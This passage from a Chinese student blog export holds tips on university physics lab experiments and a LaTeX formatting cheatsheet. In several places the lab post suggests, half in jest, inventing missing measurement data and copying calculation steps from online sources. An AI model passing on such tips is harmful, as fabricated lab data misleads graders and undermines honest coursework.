第一步的粗调非常重要，决定了你接下来的调整速度。个人经验是在实验前千万不要去玩那些螺丝，也许上个人已经调好了，上来随便调一调就合格，可以直接做实验。\n按照正常的方法去调整就行，遇到的唯一困难就是转180°后找不到绿十字了，这时可以考虑先用眼睛去找，确定了绿十字反射回来的位置之后再去调目镜和平台，后面按照视频里或者老师讲的做就可以，应该没什么难度。\n测量三棱镜的顶角 这个实验还是挺水的。。。随便测测就行了。顶角是60°，测量结果应该是120°\n最小偏向角法测量棱镜的折射率 这个实验最大的坑就是“最小偏向角”一定要旋转三棱镜的摆放位置，直到折射光的偏转最小。（折射光在右手边就让光尽可能靠左，左手边就尽可能靠右）\n后面应该就不需要去动三棱镜了，钠光的入射光应该是可以找到的。\n最终的测量结果应该在50°50′左右。\n掠入射法测量棱镜的折射率 当时做这个实验的时候主要是不知道怎么摆放。。。好在最后找了个做过的大佬，画了个草图。\n\r\n最终的测量结果应该在39°左右。\n如果时间不够用的话，一个省时间的技巧是在测下一组数据的时候不动目镜，只转动刻度盘，这样就可以少调整一次。（如果彻底没有时间了，那就测量一组，然后写到第五组的位置上，剩下的数据全靠编。我室友就这么硬水过的。。。）\n干涉法测平板玻璃折射率 这个实验做了也不算积分，而且至少要1小时的时间，所以就没做（也没人做）。\n示波器 实验时间：2020年10月26日\n做的第一个非光学实验（绪论除外），没能AK，后面就决定重回光学的怀抱了。\n示波器的使用 这个还是挺简单的，但建议速度一定要快，给后面两个实验留点时间。\n需要注意的是，这个实验老师是会查现象的，所以最好不要尝试去水。其实水的目的不是混分，都是现象做出来了，只是时间不够时的一个手段而已，非常不建议滥用，毕竟做出实验现象还是很爽的。\n二极管伏安特性曲线 当时按照电路图连了电路，结果发现线貌似不够用，打算先测量声速。\n然后就没有然后了\n声速测量 测量声速的时候遇到了好几个坑。\n 实验前和实验后一定要记得调整频率，使得振幅最大，并记录下来。 实验的线材和器材有毒，各种连接不稳定，最后是用笔袋支撑着线才能做实验的。 我当时老师要求振幅法和李萨如法都要用，很耽误时间，建议先做第二个实验。不过我当时的老师人比较好，让我们几个人拖延了一会，硬是把数据记完了，而且没有查实验器材。  迈克尔逊干涉 实验时间：2020年11月9日\n第二个光学实验，也AK了。让人不禁感叹，光学实验真的是适合刷积分啊。\n迈克尔逊干涉 这个实验老师会讲好久（但里面有不少干货，建议认真听），我当时足足讲了1小时20分钟，讲到最后我都直接开激光偷偷调整了。\n整个调整步骤有四步，一步一步来就行，别忘了第一步是调激光入射光就行（我做完实验才发现这个事情，还好最后没出现问题）。如果发现自己找不到水平一排的三个亮点，可能是入射光没有完全射到各个镜子上，调整的时候出现问题了还是动脑子想一想吧，毕竟遇到的问题真的是各种各样的都有。\n如果发现迈克尔逊环很密的话，可能是反射镜位置不太对，调整到老师推荐的位置，然后拧一拧应该就能出来。\n装置的空程差真的让人绝望，我一开始大概转了60圈才消除掉，\n数的时候真的可能会数错。。。建议十个十个数。技巧就是一定要数内缩环，外扩真的纠结应该数到哪里。\n牛顿环干涉 感觉牛顿环是最简单的实验了，只需要调好反射镜的位置和目镜的高度就行。重点是不要数错环，我当时是从11数到20。。。建议从6数到15。\n数错了重新数其实也浪费不了多少时间，如果懒的话就继续编数据大法吧。。。\n劈尖干涉 这个实验的劈尖干涉应该是来得及做的，我当时最后有几十分钟的时间来纠结应该怎么做（其实想法一直都没问题，但我的仪器测量范围有问题，浪费了巨量时间）。当时认识的大佬没做这个实验，于是只能自己摸索了。下面是我总结的实验步骤。\n  本实验的样本无须自己制作。\n  做实验过程中遇到的唯一障碍在于测量“细丝位置到尖端的距离”。我遇到的样本为一张纸，因此与图片中的细丝有些小差别。实际操作中的装置如下图所示（左侧是尖端，右侧的小横线是纸张）。图片中的L就是需要测量的部分。具体做法大致就是把装置侧过来，显微镜对焦，然后从尖端量到纸张即可。\n\r\n  我用的仪器貌似有问题。。。小于25mm的部分手轮转不过去，最后还是借室友的仪器做的\u0026hellip;\u0026hellip;\n  在测量干涉条纹宽度时，显微镜物镜可能会被螺丝卡住，建议把装置倒过来测量，把四个突出来的螺丝放在下面当支柱。。。\n  我的测量结果是$L\\approx39\\ \\mathrm{mm}$, $n=5$时$l\\approx5.6\\ \\mathrm{mm}$。反正最后处理时别忘了还有个$n$就行，刚开始算出来的结果给我人都看傻了，最后算的大概是$50\\mu m$，感觉小了一些，不过至少还有点靠谱。\n  钠光干涉 时间：2020年11月16日\n第三个光学实验，第一个非必修实验。\n这次没有AK（这句话导致我险些被室友暴打）。还是大意了，没有闪。\n钠光双棱镜 本实验的仪器调整步骤很坑，耽误了巨量时间。。。最后只能卡点强行搞完双棱镜的实验。\n我最后总结的调整方法：\n 前面用ppt或者书上的方法都行，毕竟各个元器件的高度之类的还是比较好调的。 到最后找大小像和干涉条纹时，一定要先找干涉条纹，老师也强调了，但没说怎么操作。。。搞得我各种前后移动最后还是找不到。最后发现是双棱镜和狭缝不平行所导致的。 最好的方法是先参考别人的报告摆放好狭缝和双棱镜的位置（这样可以确保有20个条纹），让目镜紧贴双棱镜，旋转双棱镜或调整狭缝宽度以找到清晰的干涉条纹，再把目镜拉到正确的位置，找大小像并把叉丝调到中心。 实验室的双棱镜上半部分是空的，会漏光。所以如果发现目镜拉远后干涉条纹被光盖住了，可以试试把双棱镜位置提高一点。  另外，感觉目镜手轮的4和5很容易读错，读的时候一定要注意一点。仪器的位置最好和已有实验报告的位置差不多，可以对着别人的数据检查，不然最后数据偏差过大就傻了。这种东西能水过去就尽量水过去吧。。。\n钠光劳埃镜 勉强做完双棱镜，gg。祝xdm好运。\n稳态法测不良导体热导率 时间：2020年12月5日\n第一个热学实验，英文实验+研究性实验\n热学实验就离谱。把装置调好之后等着就行了，建议带个作业去写，或者把器材的数据简单处理一下。大概得等1个多小时吧，加热盘温度到达75℃之后再等散热盘温度稳定就行了。实际操作的时候不一定非要到75℃，毕竟示数会有误差，加到74.9℃之后发现一直没变化就可以记录了。（试验台在过道边上是真的坑，走来走去的对实验结果真的有影响）\n英文实验熟悉了老师的口语之后还是可以听懂的。我当时的老师人很好，和他说了想做研究性实验之后说可以让我们一直搞到下午上课前，后来直接让我们去没人的实验台做实验了（最后大概拖了30分钟）。\n我做的研究性实验就是做了个无风扇的实验，然后两个实验进行对比，结论是有风扇实验系统误差高，无风扇实验偶然误差高，并为实验在风扇上提出了两个改进方案。做研究性实验的话建议去知网找找，我就是在知网找到一篇比较风扇的论文，然后自己做实验，实验原理找了个物竞大佬教。\n（感觉上课和老师聊研究性实验的时候，全班同学都在用一种怪异的眼神看着我\u0026hellip;）\n电位差计及其应用 时间：2020年12月14日\n第一次真正意义上的电学实验\n积分已经够了，所以这次实验就比较划水\n自足电位差计 实验的电路黑板上已经画出来了，照着连接就行。这个实验不需要电流表，使用两个电阻箱进行实验。先根据标准电压的电压值（随环境温度变化）调$R_1$（比如$E_N=1.01842V$时，$R_1=1018.4\\Omega$），然后调$R_2$使得灵敏测微计无偏即可。后面就照常测量即可，一些细节老师课上都会讲。老师用万用表测出来的可能有偏差（我当时是万用表结果低了$0.004V$左右）。\n箱式电位差计测量电压 按照老师讲的去连线就行，特别注意，在最后读数的时候需要把粗调旋钮按下去。\n如果没有反应，也有可能是不小心把电源关上了。\n后面的实验就没有做，因为没做啥准备工作，现场也没想好怎么测量\u0026hellip;\n绪论实验 实验时间：2020年10月12日\n绪论实验没什么好说的，就是上来会有个小测验，建议稍微准备一下。我那次雨课堂测试，十几个人平均分3.8/10，就nm离谱。\n绪论的报告要求会略高一点点，既要列出公式也要把数值带进去的式子写上，最后再写答案。计算步骤直接上知乎抄吧。\n听说最后的给分都挺低，4分就算不错了。也不知道是不是真的。\n","date":"2020-11-17T23:16:05Z","permalink":"/post/jwsy/","title":"基物实验"},{"content":"标题及基础设置 \\documentclass[a4paper, zihao=-4, UTF8]{ctexart} \\CTEXsetup[format={\\Large\\bfseries}]{section} \\title{} \\author{} \\date{} \\pagesytle{} %\\setcounter{section}{-1} % section start from 0  \\begin{document} \\maketitle \\section{} \\section[short title]{} \\label{sec:section_with_short_title} section \\ref{sec:section_with_short_title} is a section with a short title. %交叉引用 \t\\section*{} \\subsection{} \\subsection*{} \\subsubsection{} \\subsubsection*{} \\paragraph{} \\par \\end{document} 数学符号 常用数学符号    Code Latex Code Latex     \\because $\\because$ \\therefore $\\therefore$   \\frac{a}{b} $\\frac{a}{b}$ \\dfrac{a}{b} $\\dfrac{a}{b}$   \\cdot $\\cdot$ \\cdots $\\cdots$   \\ldots $\\ldots$ \\infty $\\infty$   \\log $\\log$ \\lim $\\lim$   \\sin $\\sin$ \\cos $\\cos$   \\rightarrow $\\rightarrow$ \\int_{0}^{1} $\\int_{0}^{1}$   \\iint $\\iint$ \\oint $\\oint$   \\oiint $\\oiint$ \\iiint $\\iiint$   \\in $\\in$ \\notin $\\notin$   \\forall $\\forall$ \\exist $\\exist$   \\sqrt{a} $\\sqrt{a}$ \\exist $\\exist$   \\neg $\\neg$ \\oplus $\\oplus$    \\sum\\limits\\_{i=1}^{10}: $\\sum\\limits_{i=1}^{10}$\n\\prod\\limits\\_{i=1}^{10}: $\\prod\\limits_{i=1}^{10}$\n\\lim\\limits\\_{i\\rightarrow+\\infty}: $\\lim\\limits_{i\\rightarrow+\\infty}$\n希腊字母    Code Latex Code Latex     \\alpha $\\alpha$ \\varepsilon $\\varepsilon$   \\delta $\\delta$ \\pi $\\pi$   \\rho $\\rho$ \\lambda $\\lambda$   \\varphi $\\varphi$ \\mu $\\mu$   \\Delta $\\Delta$ \\Sigma $\\Sigma$   \\Pi $\\Pi$ \\theta $\\theta$    二元运算符    Code Latex Code Latex     \\equiv $\\equiv$ \\neq $\\neq$   \\leqslant $\\leqslant$ \\geqslant $\\geqslant$   \\sim $\\sim$ \\approx $\\approx$   \\mid $\\mid$ \\nmid $\\nmid$   \\pm $\\pm$ \\times $\\times$   \\cup $\\cup$ \\cap $\\cap$   \\subset $\\subset$ \\supset $\\supset$    括号    Code Latex Code Latex     \\left( \\right) $\\left(\\right)$ \\left[ \\right] $\\left[\\right]$   \\left\\\\{ \\right\\\\} $\\left{\\right}$ \\left\\lbrace \\right\\rbrace $\\left\\lbrace\\right\\rbrace$   \\left\u0026lt; \\right\u0026gt; $\\left\u0026lt;\\right\u0026gt;$ \\left) \\right( $\\left) \\right($   \\left|\\right| $\\left|\\right|$ \\left\u0026amp;#124; \\right\u0026amp;#124; $\\left\u0026amp;#124; \\right\u0026amp;#124;$   \\left\\{ \\right. $\\left{ \\right.$      图片 \\usepackage{graphicx} \\usepackage{subfigure} \\usepackage{caption2} \\renewcommand{\\figurename}{图} \\renewcommand{\\captionlabeldelim}{.} \\renewcommand{\\thesubfigure} {\\thefigure.\\arabic{subfigure}} \\makeatletter \\renewcommand{\\@thesubfigure}{\\thesubfigure:\\space} \\renewcommand{\\p@subfigure}{} \\makeatother \\begin{document} \\begin{figure}[h] \\centering \\includegraphics[width=0.8\\textwidth]{filepath/pngname.png} \\caption{caption of this figure} \\label{label of this figure} \\end{figure} \\begin{figure}[H] \\centering \\subfigure[caption of this subfigure-1]{ \\includegraphics[width=0.45\\textwidth]{filepath/pngname} \\label{label of this subfigure-1} } \\subfigure[caption of this subfigure-2]{ \\includegraphics[width=0.45\\textwidth]{filepath/pngname} \\label{label of this subfigure-2} } \\caption{caption of figures} \\label{label of figures} \\end{figure} use \\ref{label of this figure} to quote it. %交叉引用 \\end{document} 代码块 \\usepackage{listings} \\usepackage{xcolor} \\setmonofont{Consolas} \\setsansfont{Consolas} \\lstset{ columns=fixed, breakatwhitespace=true, breaklines=true, breakindent=26pt, captionpos=bl, numbers=left, frame=shadowbox, basicstyle=\\ttfamily, keywordstyle=\\ttfamily\\color{blue}, numberstyle=\\footnotesize\\color{darkgray}, commentstyle=\\ttfamily\\it\\color[RGB]{0,96,96}, stringstyle=\\ttfamily\\color{magenta}, showstringspaces=false, language=Java, identifierstyle=\\ttfamily, tabsize=4, } \\begin{document} \\begin{lstlisting}[title={\\bf your.title}] % put your code here \t\\end{lstlisting} \\end{document} 作者 \\usepackage{authblk} \\renewcommand*{\\Affilfont}{\\small} % 修改机构名称的字体与大小 \\renewcommand\\Authand{, } % 去掉 and 前的逗号  \\title{\\textbf{Title} } \\author[1]{xxx} \\author[2]{xxx} \\affil[1]{(\\it xx大学\\ xx学院,\\ \\rm 0000)} \\affil[2]{(\\it xx大学\\ xx学院,\\ \\rm 0000)} \\date{} 摘要 中英文摘要\n\\newcommand{\\enabstractname}{Abstract} \\newcommand{\\cnabstractname}{摘要} \\newenvironment{cnabstract}{% \t\\par\\small \\noindent\\mbox{}\\hfill{\\bfseries \\cnabstractname}\\hfill\\mbox{}\\par \\vskip 2.5ex}{\\par\\vskip 2.5ex} \\newenvironment{enabstract}{% \t\\par\\small \\noindent\\mbox{}\\hfill{\\bfseries \\enabstractname}\\hfill\\mbox{}\\par \\vskip 1.5ex}{\\par\\vskip 2.5ex} \\begin{document} \\begin{cnabstract} xxx \\textbf{关键词：}xxx;xxx;xxx \\end{cnabstract} \\begin{enabstract} xxx \\textbf{Keywords:}xxx;xxx;xxx; \\end{enabstract} \\end{document} 交叉引用 \\usepackage{hyperref} \\hypersetup{ colorlinks=true, citecolor=blue, linkcolor=blue } \\begin{document} \\ref{label} \\nameref{label} \\cite{1} % cite a reference \t\\begin{thebibliography}{99} % reference \t\\bibitem{1} xxx,xxx,xxx \\end{thebibliography} \\end{document} 附录 \\usepackage{appendix} \\renewcommand{\\appendixname}{Appendix~\\Alph{section}} \\begin{document} \\newpage \\appendix \\section{xxxxx} \\end{document} 画图 闲得无聊查了一下，惊奇地发现Latex甚至可以画图，而且功能极其庞大，甚至有老哥画了个印度地图。。。\nhttps://texample.net/tikz/examples/\n找到个网站。要用的时候到里面找吧。\n","date":"2020-11-15T23:45:58Z","permalink":"/post/my-latex-cheatsheet/","title":"My Latex Cheatsheet"}]